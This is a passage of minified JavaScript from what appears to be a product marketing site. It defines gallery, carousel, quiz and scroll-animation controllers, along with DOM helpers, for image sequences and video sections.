e,i=[],r=document.createTreeWalker(t,NodeFilter.SHOW_TEXT);for(;e=r.nextNode();)i.push(e);return i}function $q(t,e){e.parentNode.insertBefore(t,e.nextSibling)}function Lq(){let t=t=>{t.preventDefault()},e=new nq;return e.add({element:window,on:"wheel",callback:t,eventOptions:{passive:!1}}),e.add({element:window,on:"touchmove",callback:t,eventOptions:{passive:!1}}),()=>{e.dispose()}}function Dq(t,e=!1){let i=px(t);e&&(i=[i[i.length-1]]);i.forEach((t=>{t.nodeValue=t.nodeValue.replace(/\s+([^\s]*)\s*$/," $1")}))}function kq(){return document.scrollingElement||document.documentElement}function Fq(t,e){if(t===e)return!1;let i=t.getBoundingClientRect(),r=e.getBoundingClientRect();return!(i.right<r.left||i.left>r.right||i.bottom<r.top||i.top>r.bottom)}function Nq(t){document.head.insertAdjacentHTML("beforeend",`<style>${t}</style>`)}function Vq(t,e){return function e(i){return i&&i!==document&&i!==window?i.closest(t)||e(i.getRootNode().host):null}(e)}function qq(t){Array.from(t.querySelectorAll("[loading=lazy]")).forEach((t=>{t.removeAttribute("loading")}))}function Bq(t,e,i){let r=t=>{let e=(t=t||window.event).target||t.srcElement;e=3===e.nodeType?e.parentNode:e;do{i(e,t),e.parentNode&&(e=e.parentNode)}while(e.parentNode)};return t.addEventListener(e,r),()=>{t.removeEventListener(e,r)}}var hl=class{constructor(){this.flushScheduled=!1,this.preReads=[],this.reads=[],this.writes=[],this.postWrites=[],this.rafs=[]}static runRafCallbacks(t){for(;t.length;){let e=t.splice(0,1)[0];!e.raf.isDisposed&&(e.raf.isPlaying||e.raf.isReadWriteOnly)&&e.callback()}}start(){this.flushScheduled||(this.flushScheduled=!0,requestAnimationFrame((()=>{this.runRaf()})))}runRaf(){window.DEGU_RAF_REGISTRY_DEBUG&&console.log("Running raf",this.reads.length,this.writes.length),hl.runRafCallbacks(this.preReads),hl.runRafCallbacks(this.reads),hl.runRafCallbacks(this.writes),hl.runRafCallbacks(this.postWrites),this.flushScheduled=!1,(this.preReads.length||this.reads.length||this.writes.length||this.postWrites.length)&&this.start()}addOneTimePreRead(t){this.preReads.push(t),this.start()}addOneTimeRead(t){this.reads.push(t),this.start()}addOneTimeWrite(t){this.writes.push(t),this.start()}addOneTimePostWrite(t){this.postWrites.push(t),this.start()}getActiveRafCount(){return this.rafs.filter((t=>t.isPlaying)).length}getRafCount(){return this.rafs.length}register(t){this.rafs.push(t)}unregister(t){this.rafs=this.rafs.filter((e=>e===t))}};"undefined"!=typeof window&&!window.DEGU_RAF_REGISTRY&&(window.DEGU_RAF_REGISTRY=new hl);var mx=class{static get $inject(){return["$rootScope","$scope","$sce","$element","$compile"]}constructor(t,e,i,r,n){this.jQuery=window.jQuery,this.$rootScope=t,this.$sce=i,this.$element=r,this.element=r[0],this.$compile=n,this.$scope=e,window.URLSearchParams&&new URLSearchParams(window.location.search).has("MQN_DEBUG")&&(window.MQN_ENABLE_DEBUG=!0),this.flipSide=!1,this.wombatImage=new wi({multiplier:1.7}),this.data=null,this.mockDatas=null,this.getData_();let s=()=>{this.data&&(this.data=this.processImages_(this.data),this.$rootScope.$apply())};window.addEventListener("resize",s),e.$on("$destroy",(()=>{window.removeEventListener("resize",s),this.dispose_()}))}isMobile(){return window.innerWidth<768}getData_(){let t=this.element.closest("[data-wombat]");this.data=JSON.parse(t.getAttribute("data-wombat")),this.data=this.processImages_(this.data),window.MQN_ENABLE_DEBUG&&console.log(JSON.stringify(this.data)),window.setTimeout((()=>{this.$scope.$apply()}))}processImages_(t){for(let e in t)Array.isArray(t[e])?t[e]=t[e].map((t=>{for(let e in t)Object.prototype.hasOwnProperty.call(t,e)&&(t[e]=this.wombatImage.processImage(t[e]));return t})):t[e]=this.wombatImage.processImage(t[e]);return t}htmlSafe(t){return this.$sce.trustAsHtml(t)}focusOn(t){let e=this.element.querySelector(`[${t}]`);e&&window.setTimeout((()=>{im.forceVOFocus(e)}))}dispose_(){}},gx=mx,vx=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.initialized=!1,this.gallery=null,this.jQuery=window.jQuery,this.$scope=i,this.$rootScope=t,i.$on("$destroy",(()=>{this.dispose_()}))}init(t){this.options=t,this.options.infinite=!1,this.options.rows="0",this.originalOptions=JSON.parse(JSON.stringify(this.options));let e=document.getElementById(t.galleryRootId);e||(e=this.el.querySelector(["[mqn-slick-gallery]"])||this.el),this.gallery=this.jQuery(e),this.initialized=!0,window.setTimeout((()=>{this.gallery.slick(this.options),this.gallery.slick("reinit")})),this.gallery.on("init",((t,e,i)=>{this.slick=e,this.initialized=!0,this.index=e.currentSlide,this.count=e.slideCount,this.updateOptions_(),window.setTimeout((()=>{this.$scope.$apply()}))})),this.gallery.on("afterChange",((t,e,i)=>{this.slick=e,this.index=e.currentSlide,window.setTimeout((()=>{this.$scope.$apply()}))}));let i=()=>{this.updateOptions_()};window.addEventListener("resize",i,{passive:!0}),this.windowResizeDispose=()=>{window.removeEventListener("resize",i)},this.postCreateSlick_&&this.postCreateSlick_(),window.unslick=()=>{this.gallery&&this.gallery.slick("unslick")},window.slick=()=>{this.gallery.slick(this.options)}}updateOptions_(){window.innerWidth;this.options=JSON.parse(JSON.stringify(this.originalOptions)),this.options.responsive&&this.options.responsive&&this.options.responsive.forEach((t=>{let e=t.breakpoint,i=t.settings;window.innerWidth<e&&(this.options=Object.assign(this.options,i))})),window.setTimeout((()=>{this.$scope.$apply()}))}getCurrentSlideIndex(){if(this.galleryEl)return this.gallery.slick("slickCurrentSlide")}isFirstSlide(){return 0==this.index}isLastSlide(){return this.count-this.index<=this.options.numberVisible}goToIndex(t){return this.gallery.hasClass("slick-initialized")&&this.gallery.slick("slickGoTo",t),!0}next(){this.goToIndex(this.index+this.options.slidesToScroll)}prev(){this.goToIndex(this.index-this.options.slidesToScroll)}dispose_(){this.windowResizeDispose&&this.windowResizeDispose(),this.gallery&&this.gallery.slick("unslick"),this.gallery=null,this.slick=null}},yx=vx,_x=ye(Jt()),bx=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.$scope=e,this.slides=Array.from(t[0].querySelectorAll("[slide]")),this.nextSlideInterval=null,this.autoplayDuration=8e3,this.ev=_x.elementVisibility.inview(this.el,{},((t,e)=>{e.isIntersecting?(this.activeSlideIndex=0,this.$scope.$broadcast("TemplateCarouselUpdateEvent",this.activeSlideIndex),this.nextSlideInterval=window.setTimeout((()=>{this.goToSlide(1,!1),this.$scope.$apply()}),this.autoplayDuration)):window.clearTimeout(this.nextSlideInterval)})),e.$on("$destroy",(()=>this.dispose_()))}goToSlide(t,e=!0){let i=(this.slides.length+t)%this.slides.length;this.activeSlideIndex!==i&&(window.clearTimeout(this.nextSlideInterval),this.activeSlideIndex=i,this.$scope.$broadcast("TemplateCarouselUpdateEvent",this.activeSlideIndex),this.ev.state().inview&&e&&To(this.el,"tab",this.activeSlideIndex),this.nextSlideInterval=window.setTimeout((()=>{this.goToSlide(i+1,!1),this.$scope.$apply()}),this.autoplayDuration))}setAutoplayDuration(t){this.autoplayDuration=t}goToNextSlide(){this.goToSlide(this.activeSlideIndex+1)}goToPreviousSlide(){this.goToSlide(this.activeSlideIndex-1)}dispose_(){window.clearTimeout(this.nextSlideInterval),this.ev.dispose()}},wx=bx,Ex=ye(Jt()),Wq=new Di([[["xs","1","square"],1],[["xs","1","rectangle"],1],[["xs","1","l"],2],[["xs","2","square"],1],[["xs","2","rectangle"],2],[["xs","2","l"],2],[["xs","3","square"],2],[["xs","3","rectangle"],3],[["xs","3","l"],3],[["sm","1","square"],2],[["sm","1","rectangle"],2],[["sm","1","l"],3],[["sm","2","square"],2],[["sm","2","rectangle"],3],[["sm","2","l"],3],[["sm","3","square"],3],[["sm","3","rectangle"],4],[["sm","3","l"],4],[["md","1","square"],3],[["md","1","rectangle"],3],[["md","1","l"],4],[["md","2","square"],3],[["md","2","rectangle"],4],[["md","2","l"],4],[["md","3","square"],4],[["md","3","rectangle"],4],[["md","3","l"],4],[["lg","1","square"],4],[["lg","1","rectangle"],4],[["lg","1","l"],4],[["lg","2","square"],4],[["lg","2","rectangle"],4],[["lg","2","l"],4],[["lg","3","square"],4],[["lg","3","rectangle"],4],[["lg","3","l"],4]]),Sx=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.answers={},this.$scope=i,this.inView=!1;let r=this.el.querySelector("[cards]");this.ev=Ex.elementVisibility.inview(r,null,(()=>{this.inView=this.ev.state().inview,this.$scope.$apply()}))}isCardVisible(t){if("size"==t){let t=Object.keys(this.answers).length;return this.inView||t>0}return"floors"==t?"size"in this.answers:"shape"==t&&"floors"in this.answers}setAnswer(t,e){this.answers[t]=e}goBack(t,e){delete this.answers[t],delete this.answers[e]}getRecommendation(){return Wq.get([this.answers.size,this.answers.floors,this.answers.shape])}},Ax=Sx,Cx=ye(Gn()),Tx=ye(Nt()),xx=ye(Ki()),qr=ye(gt()),Ix=ye(Jt()),_m=class{static get $inject(){return["$rootScope","$element","$scope","$window"]}constructor(t,e,i,r){this.el=e[0],this.ev=Ix.elementVisibility.inview(this.el,{rootMargin:"100px"}),this.elements={stickyParent:this.el.querySelector("[sticky-parent]"),stickyChild:this.el.querySelector("[sticky-child]"),header:this.el.querySelector("[header]"),header2:this.el.querySelector("[header2]"),images:this.el.querySelector("[images]"),image1:this.el.querySelector("[image1]"),image2:this.el.querySelector("[image2]"),image3:this.el.querySelector("[image3]"),toutsWrapper:this.el.querySelector("[touts-wrapper]"),content:this.el.querySelector("[content]"),touts:this.el.querySelector("[touts]"),tout1:this.el.querySelector("[tout1]"),tout2:this.el.querySelector("[tout2]"),tout3:this.el.querySelector("[tout3]"),expander:this.el.querySelector("[expander]")},this.domWatcher=new Tx.DomWatcher,this.domWatcher.add({element:window,on:"smartResize",callback:this.onResize.bind(this),eventOptions:{passive:!0},id:"resize"}),this.domWatcher.add({element:window,on:"scroll",callback:qr.func.debounce((()=>{this.onScroll()}),0),runWhen:()=>this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0},id:"scroll"}),this.interpolations=new xx.CssVarInterpolate(this.el),this.interpolations.renderOnlyWhenInview=!1,this.rafProgress=new qr.RafProgress((t=>{this.onProgressUpdate(t)})),this.onResize(),this.updateProgress(1),this.ev.readyPromise.then((()=>{this.onScroll()})),i.$on("$destroy",(()=>this.dispose()))}isSlowerDevice(){return qr.is.safari()}isMobile(){return window.innerWidth<768}isPortait(){return window.innerWidth<window.innerHeight}onScroll(){this.updateProgress(.14)}updateProgress(t){let e=this.isMobile()?qr.dom.getElementScrolledPercent(this.el,0,0):qr.dom.getElementScrolledPercent(this.el,0,-300);this.rafProgress.easeTo(e,t,qr.EASE.linear),e>=.4*window.innerHeight/this.el.offsetHeight&&this.el.classList.add("inview"),e<=0&&this.el.classList.remove("inview")}onProgressUpdate(t){this.progress=t,this.interpolations.update(t)}onResize(){this.interpolations.flush(),this.calculateImageSize(),qr.func.wait(3).then((()=>{this.calculateInterpolation(),this.onScroll()}))}calculateImageSize(){this.expanderBox={width:this.elements.expander.offsetWidth,height:this.elements.expander.offsetHeight},this.elements.stickyChild.style.top="",this.elements.stickyChild.style.paddingBottom="",this.elements.stickyChild.style.marginBottom="",this.elements.stickyParent.style.height="",this.elements.header.style.marginBottom="",this.elements.header2.style.top="",this.elements.header2.style.bottom="",this.expandYStart=0,this.elements.expander.style.left=(window.innerWidth-this.expanderBox.width)/2+"px",this.yOffset=(window.innerHeight-this.expanderBox.height)/2}calculateInterpolation(){let t={width:this.elements.image1.offsetWidth,height:this.elements.image1.offsetHeight},e=qr.mathf.calculateBackgroundCover(t,this.expanderBox),i=e.xOffset/e.width*100,r=e.yOffset/e.height*100,n=(window.innerHeight-this.elements.touts.offsetHeight)/2,s=window.innerHeight-this.elements.touts.offsetHeight,o=Math.min(n,s);if(!this.isMobile()){if(window.innerWidth<window.innerHeight&&window.innerWidth<830){let t=window.innerHeight-window.innerWidth;this.expandYStart=this.expandYStart-.1*t}this.elements.header.style.marginBottom=-o+"px"}let a=this.elements.stickyParent.offsetHeight,l=(this.elements.header.offsetHeight+this.elements.touts.offsetHeight+o)/a,h=(1-l)/2;if(this.markers={headerOpacityStart:Math.max(0,l-.1),expandPoint:l,expandPointEnd:l+1*h,blurPointStart:l+1.1*h,blurPointEnd:l+1.15*h,opacityStart:l+1.2*h,opacityEnd:l+1.3*h},this.isMobile()){let t=window.innerWidth<window.innerHeight;if(this.expandYStart=this.elements.tout2.offsetTop-e.yOffset,t){this.elements.stickyChild.style.top=-(this.elements.tout3.offsetTop+this.elements.tout3.offsetHeight)+(window.innerHeight-this.elements.tout3.offsetHeight)/2+"px";let t=.25*window.innerHeight;this.elements.stickyChild.style.marginBottom=-t+"px",this.elements.header2.style.bottom=t+"px",this.yOffset=this.elements.tout2.offsetTop}else this.elements.stickyChild.style.top=-(this.elements.tout3.offsetTop+this.elements.tout3.offsetHeight)+"px";let i,r=.25*window.innerHeight;this.elements.stickyChild.style.marginBottom=-r+"px",this.elements.header2.style.bottom=r+"px",o=0,i=(this.elements.tout2.offsetTop+this.elements.header.offsetHeight+window.innerHeight)/a,h=1-i,this.markers={headerOpacityStart:Math.max(0,i-.3),expandPoint:i,expandPointEnd:i+.3*h,blurPointStart:i+.3*h,blurPointEnd:i+.4*h,opacityStart:i+.45*h,opacityEnd:i+.5*h}}let c=this.isMobile()?qr.EASE.linear:Cx.CubicBezier.makeEasingFunction(.41,.28,.71,.13),u=[{id:"--stagger-factor-expand",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:0,end:1}]},{id:"--sticky-offset-y",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:o+"px",end:"0px",easingFunction:c}]},{id:"--sticky-offset-y-reverse",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:"0px",end:-o+"px",easingFunction:c}]},{id:"--header-opacity",progress:[{from:this.markers.headerOpacityStart,to:this.markers.expandPoint,start:1,end:0,easingFunction:c}]},{id:"--expander-clip-y",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:r+"%",end:"0%",easingFunction:c}]},{id:"--expander-clip-x",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:i+"%",end:"0%",easingFunction:c}]},{id:"--expander-scale",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:e.scalar,end:1,easingFunction:c}]},{id:"--expander-y",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:o+this.expandYStart+"px",end:this.yOffset+"px",easingFunction:c}]},{id:"--expander-y-mobile",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:o+this.expandYStart+"px",end:o+this.expandYStart+"px",easingFunction:c}]},{id:"--tout1-y",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:"0px",end:this.yOffset+"px",easingFunction:c}]},{id:"--tout3-y",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:"0px",end:this.yOffset+"px",easingFunction:c}]},{id:"--tout1-x",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:"0px",end:-window.innerWidth/2+"px",easingFunction:c}]},{id:"--tout3-x",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:"0px",end:window.innerWidth/2+"px",easingFunction:c}]},{id:"--tout2-mobile-y",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:"0vh",end:"80vh",easingFunction:c}]},{id:"--image-swipe",progress:[{from:this.markers.expandPoint,to:this.markers.expandPointEnd,start:"100%",end:"0%"}]},{id:"--image-blur-opacity",progress:[{from:this.markers.blurPointStart,to:this.markers.blurPointEnd,start:0,end:1}]},{id:"--header2-opacity",progress:[{from:this.markers.opacityStart,to:this.markers.opacityEnd,start:0,end:1}]}];this.interpolations.setInterpolations({interpolations:u})}dispose(){this.domWatcher.dispose(),this.ev.dispose()}},Px=_m,fl=ye(gt()),Mx=ye(Nt()),$x=ye(Jt()),Lx=ye(Rx()),Dx=ye(gt()),wm=class{static get $inject(){return["$rootScope","$element","$scope","$window"]}constructor(t,e,i,r){this.el=e[0],this.$scope=i,i.$on("$destroy",(()=>this.dispose())),this.loaded=!1,this.currentIndex=null,this.in=!1,this.activeClass="active",this.outgoingClass="out",this.slideTimer=null,this.wombatImage=new wi(1),this.elements={images:Array.from(this.el.querySelectorAll("[image]")),queries:Array.from(this.el.querySelectorAll("[query] > span")),swiper:this.el.querySelector("[swiper]"),header:this.el.querySelector("[header]")},this.headerHeight=null,this.ev=$x.elementVisibility.inview(this.el,{},((t,e,i)=>{e.isIntersecting||(this.stop(),this.in=!1,this.currentIndex=null,this.el.classList.remove("in"),this.elements.queries.forEach((t=>{t.classList.remove(this.activeClass),t.classList.remove(this.outgoingClass)})),this.elements.images.forEach((t=>{t.classList.remove(this.activeClass),t.classList.remove(this.outgoingClass)})))})),this.domWatcher=new Mx.DomWatcher,this.domWatcher.add({element:window,on:"scroll",callback:this.onScroll.bind(this),runWhen:()=>this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0},id:"scroll"}),this.domWatcher.add({element:window,on:"smartResize",callback:()=>{this.headerHeight=this.elements.header.offsetHeight},eventOptions:{passive:!0},id:"resize"}),this.domWatcher.run("scroll"),this.domWatcher.run("resize"),this.splitQueries()}splitQueries(){this.elements.queries.forEach((t=>{new Lx.TextSplit({element:t,split:" "}).split()}))}onScroll(){if(this.progress=fl.dom.getElementScrolledPercent(this.el,this.headerHeight),this.progress>=0&&this.ev.state().inview&&!this.in){if(!this.ev.state().inview)return;this.in=!0,this.el.classList.add("in"),this.slideTo(0,!0)}}stop(){window.clearTimeout(this.slideTimer)}slideTo(t){t!=this.currentIndex&&(this.transitioning||(this.stop(),this.transitioning=!0,Dx.func.wait(600).then((()=>{this.transitioning=!1})),this.updateActiveSlides_(t),window.setTimeout((()=>{this.updateActiveQueries_(t)}),300),this.elements.swiper.classList.remove(this.activeClass),window.setTimeout((()=>{this.elements.swiper.classList.add(this.activeClass)})),this.currentIndex=t,window.setTimeout((()=>{this.$scope.$digest()})),this.slideTimer=window.setTimeout((()=>{let t=this.currentIndex<this.elements.images.length-1?this.currentIndex+1:0;this.slideTo(t)}),5400)))}updateActiveSlides_(t){this.elements.images.forEach((t=>{t.classList.remove(this.activeClass),t.classList.remove(this.outgoingClass)})),fl.is.number(this.currentIndex)&&this.elements.images[this.currentIndex].classList.add(this.outgoingClass),window.setTimeout((()=>{this.elements.images[t].classList.add(this.activeClass)}))}updateActiveQueries_(t){fl.is.number(this.currentIndex)&&this.elements.queries[this.currentIndex].classList.add(this.outgoingClass),this.elements.queries.forEach((t=>{t.classList.remove(this.activeClass),t.classList.remove(this.outgoingClass)})),window.setTimeout((()=>{this.elements.queries[t].classList.add(this.activeClass)}))}dispose(){this.domWatcher.dispose(),this.ev.dispose()}},kx=wm,Fx=ye(Gn()),Nx=ye(Jt()),oi=ye(gt()),Vx=ye(Nt()),qx=ye(Ba()),Bx=ye(Ki()),Em=class{static get $inject(){return["$rootScope","$element","$scope","$window"]}constructor(t,e,i,r){this.$window=r,this.$scope=i,this.$rootScope=t,this.$element=e,this.el=e[0],this.stickyParentElement=this.el.querySelector("[sticky-parent]"),this.sequenceElement=this.el.querySelector("[intro-sequence]"),this.loading=!1,this.progress=0,this.wombatImage=new wi(1),this.gdnHeaderHeight=0,this.ev=Nx.elementVisibility.inview(this.el,{rootMargin:"40px"}),this.ev.readyPromise.then((()=>{this.init()})),i.$on("$destroy",(()=>this.dispose()))}init(){this.domWatcher=new Vx.DomWatcher,this.updateCanvasHeight();let t=oi.is.supportingWebp();this.sequenceSrcs=JSON.parse(this.el.getAttribute("data-sequence")),this.sequenceSrcs=this.sequenceSrcs.map(((e,i)=>this.wombatImage.appendFifeParams(e,t))),this.sequenceSrcs=this.sequenceSrcs.filter(((t,e)=>e%2==0)),this.sequenceSrcs=bi.addFifeUrlParamsToUrls(this.sequenceSrcs),this.sequenceMobileSrcs=JSON.parse(this.el.getAttribute("data-sequence-mobile")),this.sequenceMobileSrcs=this.sequenceMobileSrcs.map(((e,i)=>this.wombatImage.appendFifeParams(e,t))),this.sequenceMobileSrcs=this.sequenceMobileSrcs.filter(((t,e)=>e%2==0)),this.sequenceMobileSrcs=bi.addFifeUrlParamsToUrls(this.sequenceMobileSrcs);this.sequenceCanvas=new qx.WebGlImageSequence(this.sequenceElement,[{images:this.sequenceSrcs,when:()=>!this.isMobile()},{images:this.sequenceMobileSrcs,when:()=>this.isMobile()}],{cover:!0}),this.sectionCssVarInterpolation=new Bx.CssVarInterpolate(this.el),this.sectionCssVarInterpolation.renderOnlyWhenInview=!1,this.setInterpolations(),this.rafProgress=new oi.RafProgress((t=>{this.onProgressUpdate(t)}));let e=this.getProgress();this.rafProgress.setCurrentProgress(e),this.ev.state().ready&&this.ev.state().inview?this.loadImages().then((()=>this.addListeners())):oi.dom.runAfterNotTopOfScreen((()=>{this.loadImages().then((()=>this.addListeners()))}))}loadImages(){this.loading=!0;let t=[];return t.push(this.sequenceCanvas.load()),Promise.all(t).then((()=>{this.loading=!1,this.el.classList.add("loaded"),this.sequenceCanvas.renderByProgress(this.rafProgress.currentProgress)}))}updateCanvasHeight(){let t=document.querySelector("[pdp-bar]");if(t){let e=t.offsetHeight||0;this.gdnHeaderHeight=e}let e=0,i=0,r=window.innerHeight-this.gdnHeaderHeight;if(!this.isMobile()){r=1800*window.innerWidth/2880,r<window.innerHeight&&(r=window.innerHeight);let t=(window.innerHeight-r)/2;e=t+this.gdnHeaderHeight,i=t-this.gdnHeaderHeight}if(window.innerWidth<900){let t=375/667*window.innerWidth;r<t&&(r=t)}this.sequenceElement.style.height=`${r}px`,this.sequenceElement.style.top=`${e}px`,this.sequenceElement.style.marginBottom=`${i}px`}addListeners(){this.domWatcher.add({element:window,on:"scroll",callback:oi.func.debounce((()=>{this.onScroll()}),24),runWhen:()=>this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0},id:"scroll"}),this.domWatcher.add({element:window,on:"smartResize",callback:this.onResize.bind(this),eventOptions:{passive:!0},id:"resize"}),this.domWatcher.run("resize"),this.domWatcher.run("scroll")}isMobile(){return window.innerWidth<=1024}setInterpolations(){let t=[{id:"--title-y",progress:[{from:.59,to:.74,start:"0vh",end:"-30vh",easingFunction:Fx.CubicBezier.makeEasingFunction(.41,.28,.71,.13)}]},{id:"--compare-title-opacity",progress:[{from:.55,to:.71,start:0,end:1}]},{id:"--compare-title-y",progress:[{from:.55,to:.71,start:"30px",end:"0px"}]},{id:"--canvas-y",progress:[{from:.57,to:.75,start:"0vh",end:"-12vh"}]}];this.sectionCssVarInterpolation.setInterpolations({interpolations:t})}onAssetLoadComplete(){}getProgress(){return oi.dom.getElementScrolledPercent(this.stickyParentElement,window.innerHeight-this.gdnHeaderHeight,0)}onScroll(){let t=this.getProgress();this.rafProgress.easeTo(t,.16,oi.EASE.linear)}onResize(){this.updateCanvasHeight(),this.sequenceCanvas.resize();let t=te.mqnCssName("mqn2-mento-hardware__compare__sections"),e=this.el.querySelector(`.${t}`),i=window.innerWidth/window.innerHeight;if(this.isMobile()||i>1.6)e.style.width=null;else{let t=.815,i=1.6*window.innerHeight*t;e.style.width=`${i}px`}this.setInterpolations()}onProgressUpdate(t){this.progress=t;let e=oi.mathf.childProgress(t,0,1);this.sequenceCanvas.renderByProgress(e),this.sectionCssVarInterpolation.update(this.progress),this.el.classList.toggle("--compare-section-inview",t>=.5),this.el.classList.toggle("--show-compare-title",t>=.5),this.el.classList.toggle("--show-compare",t>=.9)}dispose(){this.ev.dispose(),this.domWatcher.dispose(),this.sequenceCanvas.dispose()}},Wx=Em,Bi=ye(Gn()),Ux=ye(Jt()),Hx=ye(Nt()),$r=ye(gt()),Gx=ye(Ki()),Sm=class{static get $inject(){return["$rootScope","$element","$scope","$window"]}constructor(t,e,i,r){this.$window=r,this.$scope=i,this.$rootScope=t,this.$element=e,this.el=e[0],this.elements={sticky_parent:this.el.querySelector("[parent]"),sticky_child:this.el.querySelector("[child]"),header:this.el.querySelector("[header]"),chapters:this.el.querySelector("[chapters]"),chapter1:this.el.querySelector("[chapter1]"),chapter2:this.el.querySelector("[chapter2]"),videos:this.el.querySelector("[videos]"),video1:this.el.querySelector("[video1]"),video2:this.el.querySelector("[video2]"),video1Video:this.el.querySelector("[video1] video"),video2Video:this.el.querySelector("[video2] video")},this.scrollToOnFocus=new an({element:this.elements.sticky_parent,debug:!1,setTabIndex:!0,top:window.innerHeight}),this.ev=Ux.elementVisibility.inview(this.el,{rootMargin:"100px"}),this.cssVarInterpolater=new Gx.CssVarInterpolate(this.el),this.cssVarInterpolater.useBatchUpdate(!0),this.cssVarInterpolater.renderOutview(!0),this.rafProgress=new $r.RafProgress,this.rafProgress.easeTo(this.getProgress(),1,$r.EASE.Linear),this.rafProgress.watch(this.onProgressUpdate.bind(this)),this.domWatcher=new Hx.DomWatcher,this.domWatcher.add({element:window,on:"smartResize",callback:this.onResize.bind(this),eventOptions:{passive:!0},id:"resize"});this.domWatcher.add({element:window,on:"scroll",callback:$r.func.throttle((t=>{this.onScroll()}),0),runWhen:()=>this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0}}),this.domWatcher.run("resize"),this.domWatcher.run("scroll"),i.$on("$destroy",(()=>this.dispose()))}forceProgressUpdate(){this.onProgressUpdate(this.progress)}getProgress(){return $r.dom.getElementScrolledPercent(this.el,window.innerHeight)}onScroll(){this.rafProgress.easeTo(this.getProgress(),.08,$r.EASE.Linear)}onResize(){this.setInterpolations(),this.scrollToOnFocus.updateOffset(window.innerHeight,0),window.setTimeout((()=>{this.cssVarInterpolater.flush(),this.forceProgressUpdate()}))}isMobile(){return window.innerWidth<768}isPortait(){return window.innerWidth<window.innerHeight}onProgressUpdate(t,e){this.progress=t,this.cssVarInterpolater.update(this.progress)}setInterpolations(){let t=this.elements.chapter1.offsetHeight,e=this.elements.chapter2.offsetHeight,i=Math.max(t,e),r={width:this.isMobile()?1472:2880,height:1920},n=this.elements.header.offsetHeight,s=2,o=$r.mathf.calculateBackgroundCover({width:window.innerWidth,height:window.innerHeight},r),a=.25*o.height,l=i+70,h=Math.max(0,l-a),c=this.isMobile()?0:Math.max(0,o.height-window.innerHeight),u=this.isMobile()?0:c+h;if(this.isMobile()&&this.isPortait()){let t=$r.mathf.calculateBackgroundContain({width:window.innerWidth,height:window.innerHeight},r),e=r.height*t,n=Math.max(0,e+i-window.innerHeight);c=n,u=n}this.elements.sticky_child.style.height=window.innerHeight+u+"px",this.elements.video1.style.height=window.innerHeight+c+"px",this.elements.video2.style.height=window.innerHeight+c+"px",this.elements.videos.style.height=window.innerHeight+u+"px";let d=n+70,p=u,m=window.innerHeight-i,f=(window.innerHeight,d/2-d);this.isMobile()&&this.isPortait()&&(s=2,h=.08*-window.innerHeight);let g=d/this.elements.sticky_parent.offsetHeight,y=1-g,v={intro:0,enter:g,chapterEnter:g+.15*y,chapterEnterComplete:g+.2*y,chapterEnterOut:g+.5*y,chapter2Enter:g+.55*y,chapter2EnterOut:g+.65*y},_=[{id:"--edge-opacity",progress:[{from:v.enter,to:v.chapterEnter,start:0,end:1}]},{id:"--intro-shift-y",progress:[{from:v.intro,to:v.enter,start:"0px",end:f+"px"},{from:v.enter+.5*(v.chapterEnter-v.enter),to:v.chapterEnter,start:f+"px",end:"0px",easingFunction:Bi.CubicBezier.makeEasingFunction(1,.1,.96,.61)}]},{id:"--video-1-scale",progress:[{from:v.enter,to:v.chapterEnter,start:s,end:1,easingFunction:this.isMobile()?Bi.CubicBezier.makeEasingFunction(.9,.08,1,.41):$r.EASE.linear}]},{id:"--video-1-origin",progress:[{from:v.enter,to:v.chapterEnter,start:this.isMobile()?"75%":"70%",end:this.isMobile()?"100%":"50%",easingFunction:this.isMobile()?Bi.CubicBezier.makeEasingFunction(.9,.08,1,.41):$r.EASE.linear}]},{id:"--video-1-y",progress:[{from:v.enter,to:v.chapterEnter,start:"0px",end:h+"px",easingFunction:this.isMobile()?Bi.CubicBezier.makeEasingFunction(.9,.08,1,.41):$r.EASE.linear}]},{id:"--video-clip-x",progress:[{from:v.enter,to:v.chapterEnter,start:$r.mathf.interpolateRange(window.innerWidth,300,800,0*window.innerWidth,.1*window.innerWidth)+"px",end:"0px"}]},{id:"--video-clip-top",progress:[{from:v.enter,to:v.chapterEnter,start:d+"px",end:"0px"}]},{id:"--video-clip-bottom",progress:[{from:v.enter,to:v.chapterEnter,start:p+"px",end:"0px"}]},{id:"--header-y",progress:[{from:v.enter,to:v.enter+(v.chapterEnter-v.enter)/2,start:"0px",end:-n-20+"px",easingFunction:Bi.CubicBezier.makeEasingFunction(.41,.28,.71,.13)}]},{id:"--chapter1-y",progress:[{from:v.chapterEnter,to:v.chapterEnterComplete,start:"30px",end:"0px",easingFunction:Bi.CubicBezier.makeEasingFunction(.41,.28,.71,.13)}]},{id:"--chapter1-opacity",progress:[{from:v.chapterEnter,to:v.chapterEnterComplete,start:0,end:1,easingFunction:Bi.CubicBezier.makeEasingFunction(.41,.28,.71,.13)},{from:v.chapterEnterOut,to:v.chapter2Enter,start:1,end:0,easingFunction:Bi.CubicBezier.makeEasingFunction(.41,.28,.71,.13)}]},{id:"--chapter2-y",progress:[{from:v.chapter2Enter,to:v.chapter2EnterOut,start:"30px",end:"0px",easingFunction:Bi.CubicBezier.makeEasingFunction(.41,.28,.71,.13)}]},{id:"--chapter2-opacity",progress:[{from:v.chapter2Enter,to:v.chapter2EnterOut,start:0,end:1,easingFunction:Bi.CubicBezier.makeEasingFunction(.41,.28,.71,.13)}]}];this.cssVarInterpolater.setInterpolations({interpolations:_})